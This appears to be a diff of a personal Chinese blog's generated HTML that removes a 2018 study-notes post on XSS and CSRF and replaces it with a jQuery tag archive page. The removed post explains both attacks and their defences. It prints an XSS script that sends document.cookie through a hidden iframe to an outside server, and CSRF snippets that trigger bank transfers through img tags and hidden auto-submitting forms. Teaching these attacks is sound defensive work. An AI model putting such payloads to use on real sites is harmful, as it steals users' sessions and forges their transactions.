@@ -6,23 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Web安全之XSS和CSRF | 小柯的博客</title>
+  <title>Tag: jQuery | 小柯的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="今天听了一节web安全的课程，对这个模块不是很熟悉，找了几篇博客总结一下知识点，方便以后复习，这也是我今天搭建博客之后的第一篇博客，鼓励自己多写多记吧!">
-<meta name="keywords" content="web安全,前端">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Web安全之XSS和CSRF">
-<meta property="og:url" content="http://yoursite.com/2018/08/11/Web安全之XSS和CSRF/index.html">
+  <meta name="description" content="学生一枚 喜欢技术 热爱生活">
+<meta name="keywords" content="前端 技术 生活">
+<meta property="og:type" content="website">
+<meta property="og:title" content="小柯的博客">
+<meta property="og:url" content="http://yoursite.com/tags/jQuery/index.html">
 <meta property="og:site_name" content="小柯的博客">
-<meta property="og:description" content="今天听了一节web安全的课程，对这个模块不是很熟悉，找了几篇博客总结一下知识点，方便以后复习，这也是我今天搭建博客之后的第一篇博客，鼓励自己多写多记吧!">
+<meta property="og:description" content="学生一枚 喜欢技术 热爱生活">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://yoursite.com/images/web.png">
-<meta property="og:image" content="http://yoursite.com/2018/08/images/web.png">
-<meta property="og:updated_time" content="2018-08-12T11:51:58.181Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Web安全之XSS和CSRF">
-<meta name="twitter:description" content="今天听了一节web安全的课程，对这个模块不是很熟悉，找了几篇博客总结一下知识点，方便以后复习，这也是我今天搭建博客之后的第一篇博客，鼓励自己多写多记吧!">
-<meta name="twitter:image" content="http://yoursite.com/images/web.png">
+<meta name="twitter:title" content="小柯的博客">
+<meta name="twitter:description" content="学生一枚 喜欢技术 热爱生活">
   
     <link rel="alternative" href="/atom.xml" title="小柯的博客" type="application/atom+xml">
   
@@ -184,258 +180,66 @@ var _hmt = _hmt || [];
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Web安全之XSS和CSRF" class="article article-type-post " itemscope itemprop="blogPost">
-    <div class="article-inner">
-        
-            <header class="article-header">
-                
+            
   
-    <h1 class="article-title" itemprop="name">
-      Web安全之XSS和CSRF
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2018" class="archive-year">2018</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2018/08/14/jQuery源码解读2/" class="archive-article-date">
+  	<time datetime="2018-08-14T13:28:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-14</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2018/08/14/jQuery源码解读2/">jQuery源码解读2</a>
     </h1>
   
 
-                    
-                        <a href="/2018/08/11/Web安全之XSS和CSRF/" class="archive-article-date">
-  	<time datetime="2018-08-11T00:39:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-11</time>
-</a>
-                            
-            </header>
-            
-                <!-- 目录内容 -->
-                
-                    <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
-                        <span class="btn-bg"></span>
-                        <span class="btn-text">文章导航</span>
-                    </p>
-                    <div id="toc-article" class="toc-article">
-                        <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
-                        <strong class="toc-title">文章目录</strong>
-                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web安全之XSS和CSRF"><span class="toc-number">1.</span> <span class="toc-text">Web安全之XSS和CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">1.1.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS定义"><span class="toc-number">1.1.1.</span> <span class="toc-text">XSS定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS跨站脚本攻击-Cross-site-Scipting"><span class="toc-number">1.1.2.</span> <span class="toc-text">XSS跨站脚本攻击 Cross site Scipting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#比如通过location-hash"><span class="toc-number">1.1.3.</span> <span class="toc-text">比如通过location.hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一个网页的评论有漏洞-没有转义"><span class="toc-number">1.1.4.</span> <span class="toc-text">一个网页的评论有漏洞(没有转义)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解决防范"><span class="toc-number">1.1.5.</span> <span class="toc-text">解决防范</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF：cross-site-Request-Forgery"><span class="toc-number">1.2.</span> <span class="toc-text">CSRF：cross-site Request Forgery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF可以做什么"><span class="toc-number">1.3.</span> <span class="toc-text">CSRF可以做什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF原理图"><span class="toc-number">1.4.</span> <span class="toc-text">CSRF原理图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS和CSRF的关系"><span class="toc-number">1.5.</span> <span class="toc-text">XSS和CSRF的关系</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-number">1.5.1.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三种攻击模式"><span class="toc-number">1.6.</span> <span class="toc-text">三种攻击模式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用POST来完成敏感操作（更新数据）"><span class="toc-number">1.6.1.</span> <span class="toc-text">使用POST来完成敏感操作（更新数据）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#node-js"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">node.js</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#只使用POST请求，只处理POST请求体的数据"><span class="toc-number">1.7.</span> <span class="toc-text">只使用POST请求，只处理POST请求体的数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#源于web的身份验证机制"><span class="toc-number">1.8.</span> <span class="toc-text">源于web的身份验证机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御机制"><span class="toc-number">1.9.</span> <span class="toc-text">防御机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#服务端进行CSRF防御"><span class="toc-number">1.9.1.</span> <span class="toc-text">服务端进行CSRF防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#验证码"><span class="toc-number">1.9.2.</span> <span class="toc-text">验证码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#token"><span class="toc-number">1.9.3.</span> <span class="toc-text">token</span></a></li></ol></li></ol></li></ol>
-                    </div>
-                    <script type="text/javascript">
-                        function showToc() {
-                            var toc_article = document.getElementById("toc-article");
-                            var show_toc_btn = document.getElementById("show-toc-btn");
-                            toc_article.setAttribute("style", "display:block");
-                            show_toc_btn.setAttribute("style", "display:none");
-                        };
-
-                        function showBtn() {
-                            var toc_article = document.getElementById("toc-article");
-                            var show_toc_btn = document.getElementById("show-toc-btn");
-                            toc_article.setAttribute("style", "display:none");
-                            show_toc_btn.setAttribute("style", "display:block");
-                        };
-                    </script>
-                    
-                        <!-- 目录内容结束 -->
-                        <div class="article-entry" itemprop="articleBody">
-                            
-                                                <p>今天听了一节web安全的课程，对这个模块不是很熟悉，找了几篇博客总结一下知识点，方便以后复习，这也是我今天搭建博客之后的第一篇博客，鼓励自己多写多记吧!<br><a id="more"></a></p>
-<h1 id="Web安全之XSS和CSRF"><a href="#Web安全之XSS和CSRF" class="headerlink" title="Web安全之XSS和CSRF"></a>Web安全之XSS和CSRF</h1><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="XSS定义"><a href="#XSS定义" class="headerlink" title="XSS定义"></a>XSS定义</h3><p><code>跨站脚本攻击</code>，通过客户端脚本语言在一个论坛发帖(其他<code>input</code>类型的输入框也可以)中发布一段恶意的<code>JavaScript</code>代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫<code>XSS！</code></p>
-<h3 id="XSS跨站脚本攻击-Cross-site-Scipting"><a href="#XSS跨站脚本攻击-Cross-site-Scipting" class="headerlink" title="XSS跨站脚本攻击 Cross site Scipting"></a>XSS跨站脚本攻击 Cross site Scipting</h3><p>主要原因是多数用户的输入没有被转义，而直接执行。<br>XSS可以获取到用户cookie或隐私客户端信息。</p>
-<h3 id="比如通过location-hash"><a href="#比如通过location-hash" class="headerlink" title="比如通过location.hash"></a>比如通过location.hash</h3><p>假设某个网站有一段脚本<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#box"</span>).html(location.hash.replace(<span class="string">'#'</span>,<span class="string">''</span>));</span><br></pre></td></tr></table></figure></p>
-<p>攻击者看到伪造URL<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = <span class="string">"http://a.com?"</span>+<span class="built_in">document</span>.cookie;获取用户cookie!</span><br></pre></td></tr></table></figure></p>
-<p>也就是说<strong>它利用了网站的某个漏洞，然后把脚本注入该网页</strong>，让其他登录的用户登录后就会把该用户的信息获取到并发送给一个恶意的服务器。把压缩后的url发给某个登录的用户</p>
-<h3 id="一个网页的评论有漏洞-没有转义"><a href="#一个网页的评论有漏洞-没有转义" class="headerlink" title="一个网页的评论有漏洞(没有转义)"></a>一个网页的评论有漏洞(没有转义)</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, document</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 构造泄露信息用的 URL</span></span><br><span class="line">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</span><br><span class="line">    <span class="keyword">var</span> xssURIBase = <span class="string">"http://192.168.123.123/myxss/"</span>;</span><br><span class="line">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</span><br><span class="line">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></span><br><span class="line">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">    hideFrame.height = <span class="number">0</span>;</span><br><span class="line">    hideFrame.width = <span class="number">0</span>;</span><br><span class="line">    hideFrame.style.display = <span class="string">"none"</span>;</span><br><span class="line">    hideFrame.src = xssURI;</span><br><span class="line">    <span class="comment">// 开工</span></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(hideFrame);</span><br><span class="line">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
-<p>那么这段代码就会被执行，这个代码会携带着登录用户的信息传输给<a href="http://192.168.123.123/myxss/" target="_blank" rel="noopener">http://192.168.123.123/myxss/</a>  服务器，然后服务器的代码就会接收了用户的隐式信息!<br>主要原理就是注入脚本到安全漏洞，然后发送给另外一个站点</p>
-<h3 id="解决防范"><a href="#解决防范" class="headerlink" title="解决防范"></a>解决防范</h3><p>我们不需要用户输入HTML也是输入纯文本，转义是个很好的方法。可以用白名单重复处理。用户输入的HTML可能有很复杂的结构，但我们并不将这些数据直接存入数据库，而是使用 HTML 解析库遍历节点，获取其中数据（之所以不使用 XML 解析库是因为 HTML要求有较强的容错性）。然后根据用户原有的标签属性，重新构建 HTML 元素树。构建的过程中，所有的标签、属性都只从白名单中拿取。这样可以确保万无一失——如果用户的某种复杂输入不能为解析器所识别</p>
-<h2 id="CSRF：cross-site-Request-Forgery"><a href="#CSRF：cross-site-Request-Forgery" class="headerlink" title="CSRF：cross-site Request Forgery"></a>CSRF：cross-site Request Forgery</h2><p>跨站请求伪造：冒充用户发起请求，完成一些违背用户真实意愿的请求~</p>
-<h2 id="CSRF可以做什么"><a href="#CSRF可以做什么" class="headerlink" title="CSRF可以做什么"></a>CSRF可以做什么</h2><p>你这可以这么理解CSRF攻击：<strong>攻击者盗用了你的身份，以你的名义发送恶意请求。</strong><br><strong>CSRF能够做的事情包括：</strong>以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。</p>
-<h2 id="CSRF原理图"><a href="#CSRF原理图" class="headerlink" title="CSRF原理图"></a>CSRF原理图</h2><p><img src="/images/web.png" alt="CSRF原理图"></p>
-<h2 id="XSS和CSRF的关系"><a href="#XSS和CSRF的关系" class="headerlink" title="XSS和CSRF的关系"></a>XSS和CSRF的关系</h2><ul>
-<li>CSRF更加强调一种形式，只要是伪造用户发起的请求都是CSRF攻击，而XSS更加强调是一种手段。 </li>
-<li>CSRF可以是XSS实现，也可以是其他形式来伪造请求，只要是伪造了请求即CSRF。<br><strong>完成CSRF需要两个步骤：</strong> </li>
-<li>1.登陆受信任的网站A，在本地生成 COOKIE </li>
-<li>2.在不登出A的情况下，或者本地 COOKIE 没有过期的情况下，访问危险网站B。(也有可能B要求访问A网站)</li>
-<li>CSRF不需要知道sessionid就能让用户中招。 <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><img src="/2018/08/11/Web安全之XSS和CSRF/../../images/web.png" alt="Alt text"><br>CSRF在另一个网站构造一个表单提交，提交地址是a<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=<span class="string">'test'</span> method=<span class="string">'POST'</span> action=<span class="string">"http://a.com/guestbook"</span>/  &gt;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>攻击者只要引导登录a的用户访问这个b网站，自动提交一个留言，这个提交到a网站的过程中，浏览器会将用户的cookie发送到服务器。</p>
-<h2 id="三种攻击模式"><a href="#三种攻击模式" class="headerlink" title="三种攻击模式"></a>三种攻击模式</h2><p>假设B网站有一段HTML代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=http:<span class="comment">//www.bank.com/Transfer.php?BankId=1122&amp;money=1000&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>在你登录A网站的时候，会先获取资源，同时留下你的cooki。然后当你再去访问B网站的时候，B会通过img的src属性隐式发送请求给A网站，达到模拟你发送请求的目的，来获取你的资源以及信息。</p>
-<h3 id="使用POST来完成敏感操作（更新数据）"><a href="#使用POST来完成敏感操作（更新数据）" class="headerlink" title="使用POST来完成敏感操作（更新数据）"></a>使用POST来完成敏感操作（更新数据）</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"Transfer.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">　　　　&lt;p&gt;BankId: &lt;input type="text" name="toBankId" /&gt;&lt;/p&gt;</span><br><span class="line">　　　　&lt;p&gt;Money: &lt;input type="text" name="money" /&gt;&lt;/p&gt;</span><br><span class="line">　　　　&lt;p&gt;&lt;input type="submit" value="Transfer" /&gt;&lt;/p&gt;</span><br><span class="line">　　&lt;<span class="regexp">/form&gt;</span></span><br></pre></td></tr></table></figure>
-<p>危险网站B，可以通过后台使用REQUEST去获取请求的数据，而_REQUEST既可以获取get请求的数据也可以获取post请求的数据</p>
-<h4 id="node-js"><a href="#node-js" class="headerlink" title="node.js"></a>node.js</h4><p>在node.js中，可以处理post请求的URL后面参数部分<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eq.body.username;<span class="comment">//处理请求体request body</span></span><br><span class="line">req.query.username;<span class="comment">//处理查询字符串</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="只使用POST请求，只处理POST请求体的数据"><a href="#只使用POST请求，只处理POST请求体的数据" class="headerlink" title="只使用POST请求，只处理POST请求体的数据"></a>只使用POST请求，只处理POST请求体的数据</h2><p>危险网站B将代码修改<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">　　&lt;head&gt;</span><br><span class="line">　　　　&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">　　　　　　<span class="function"><span class="keyword">function</span> <span class="title">steal</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">　　　　　　</span>&#123;</span><br><span class="line">          　　　　 iframe = <span class="built_in">document</span>.frames[<span class="string">"steal"</span>];</span><br><span class="line">　　     　　      iframe.document.Submit(<span class="string">"transfer"</span>);</span><br><span class="line">　　　　　　&#125;</span><br><span class="line">　　　　&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">　　&lt;/</span>head&gt;</span><br><span class="line"></span><br><span class="line">　　&lt;body onload=<span class="string">"steal()"</span>&gt;</span><br><span class="line">　　　　&lt;iframe name=<span class="string">"steal"</span> display=<span class="string">"none"</span>&gt;</span><br><span class="line">　　　　　　&lt;form method=<span class="string">"POST"</span> name=<span class="string">"transfer"</span>　action=<span class="string">"http://www.Bank.com/Transfer.php"</span>&gt;</span><br><span class="line">　　　　　　　　&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"BankId"</span> value=<span class="string">"11"</span>&gt;</span><br><span class="line">　　　　　　　　&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"money"</span> value=<span class="string">"1000"</span>&gt;</span><br><span class="line">　　　　　　&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">　　　　&lt;/i</span>frame&gt;</span><br><span class="line">　　&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure></p>
-<p>B网站创建了一个iframe标签，并且把它设置为display:none，隐藏表单属性，偷偷给网站A发送请求，提前把表单提交值设设置好，提交给A网站</p>
-<h2 id="源于web的身份验证机制"><a href="#源于web的身份验证机制" class="headerlink" title="源于web的身份验证机制"></a>源于web的身份验证机制</h2><p>CSRF攻击是源于WEB的隐式身份验证机制！<strong>WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！</strong></p>
-<h2 id="防御机制"><a href="#防御机制" class="headerlink" title="防御机制"></a>防御机制</h2><h3 id="服务端进行CSRF防御"><a href="#服务端进行CSRF防御" class="headerlink" title="服务端进行CSRF防御"></a>服务端进行CSRF防御</h3><p>在客户端页面增加随机数。Cookie Hashing，就是构造加密的cookie信息。由于攻击者无法获取第三方cookie，那么表单的数据就构造失败。它不知道提交什么给服务器<br>在表单里增加Hash值，在服务端验证<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=”POST” action=”transfer.php”&gt;</span><br><span class="line">　　　　&lt;input type=”text” name=”BankId”&gt;</span><br><span class="line">　　　　&lt;input type=”text” name=”money”&gt;</span><br><span class="line">　　　　&lt;input type=”hidden” name=”hash” value=”&lt;?=$hash;?&gt;”&gt;</span><br><span class="line">　　　　&lt;input type=”submit” name=”submit” value=”Submit”&gt;</span><br><span class="line">　　&lt;<span class="regexp">/form&gt;</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>每次的用户提交都需要用户在表单中填写一个图片上的随机字符串，这个方案可以完全解决CSRF，但在易用性方面似乎不是太好。</p>
-<h3 id="token"><a href="#token" class="headerlink" title="token"></a>token</h3><p>首先服务器端要以某种策略生成随机字符串，作为令牌（token），保存在 Session 里。然后在发出请求的页面，把该令牌以隐藏域一类的形式，与其他信息一并发出。在接收请求的页面，把接收到的信息中的令牌与 Session 中的令牌比较，只有一致的时候才处理请求，否则返回 HTTP 403 拒绝请求或者要求用户重新登录验证身份。<br>利用Token，嵌入到session中，当进行登录操作的时候就生成这个token，也就是说每次表单被渲染的时候，后台就会生成一个伪随机值来覆盖以前的伪随机值：用户只能成功提交他最后打开的表单，因为所有其他的表单都有非法的伪随机值。<br>请求令牌虽然使用起来简单，但并非不可破解，使用不当会增加安全隐患。</p>
-<ul>
-<li>令牌在不同页面最好是不同的使用全局的token可能会导致破解难度下降，因为令牌方法理论上是可破解的，</li>
-<li>配合验证码</li>
-<li>无论是验证码还是令牌，验证通过一定要销毁</li>
-</ul>
-
-                                                    
-
-                                                        
-                                                            <div class="page-reward">
-                                                                <a href="javascript:;" class="page-reward-btn tooltip-top">
-                                                                    <div class="tooltip tooltip-east">
-                                                                        <span class="tooltip-item">
-              赏
-            </span>
-                                                                        <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                                                                        
-                                                            </div>
-                                                            </span>
-                                                            </span>
-                                                            </span>
-                        </div>
-                        </a>
-    </div>
-    
-        </div>
-        <div class="article-info article-info-index">
-            
-                    
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">web安全</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">jQuery源码解读</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">前端</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">jQuery</a>
         		</li>
       		
 		</ul>
 	</div>
 
-                        
+          
 
-                            
-
-                                    
-                                        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
+        <div class="clearfix"></div>
+    </header>
   </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/08/11/Web安全之XSS和CSRF/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-                                            
-                                                <div class="clearfix"></div>
-        </div>
-        </div>
 </article>
+  
+  
+    </div></section>
+  
 
     
-<nav id="article-nav">
-  
-    <a href="/2018/08/12/最美中国项目总结/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          最美中国项目总结
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2018/08/10/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Hello World</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-        
-            <aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-        <div class="toc-container tooltip-left">
-            <i class="icon-font icon-category"></i>
-            <div class="tooltip tooltip-east">
-                <span class="tooltip-item">
-                </span>
-                <span class="tooltip-content">
-                    <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web安全之XSS和CSRF"><span class="toc-number">1.</span> <span class="toc-text">Web安全之XSS和CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">1.1.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS定义"><span class="toc-number">1.1.1.</span> <span class="toc-text">XSS定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS跨站脚本攻击-Cross-site-Scipting"><span class="toc-number">1.1.2.</span> <span class="toc-text">XSS跨站脚本攻击 Cross site Scipting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#比如通过location-hash"><span class="toc-number">1.1.3.</span> <span class="toc-text">比如通过location.hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一个网页的评论有漏洞-没有转义"><span class="toc-number">1.1.4.</span> <span class="toc-text">一个网页的评论有漏洞(没有转义)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解决防范"><span class="toc-number">1.1.5.</span> <span class="toc-text">解决防范</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF：cross-site-Request-Forgery"><span class="toc-number">1.2.</span> <span class="toc-text">CSRF：cross-site Request Forgery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF可以做什么"><span class="toc-number">1.3.</span> <span class="toc-text">CSRF可以做什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF原理图"><span class="toc-number">1.4.</span> <span class="toc-text">CSRF原理图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS和CSRF的关系"><span class="toc-number">1.5.</span> <span class="toc-text">XSS和CSRF的关系</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-number">1.5.1.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三种攻击模式"><span class="toc-number">1.6.</span> <span class="toc-text">三种攻击模式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用POST来完成敏感操作（更新数据）"><span class="toc-number">1.6.1.</span> <span class="toc-text">使用POST来完成敏感操作（更新数据）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#node-js"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">node.js</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#只使用POST请求，只处理POST请求体的数据"><span class="toc-number">1.7.</span> <span class="toc-text">只使用POST请求，只处理POST请求体的数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#源于web的身份验证机制"><span class="toc-number">1.8.</span> <span class="toc-text">源于web的身份验证机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御机制"><span class="toc-number">1.9.</span> <span class="toc-text">防御机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#服务端进行CSRF防御"><span class="toc-number">1.9.1.</span> <span class="toc-text">服务端进行CSRF防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#验证码"><span class="toc-number">1.9.2.</span> <span class="toc-text">验证码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#token"><span class="toc-number">1.9.3.</span> <span class="toc-text">token</span></a></li></ol></li></ol></li></ol>
-                    </div>
-                </span>
-            </div>
-        </div>
-        
-    </div>
-</aside>
 
 
-                
-                    
-
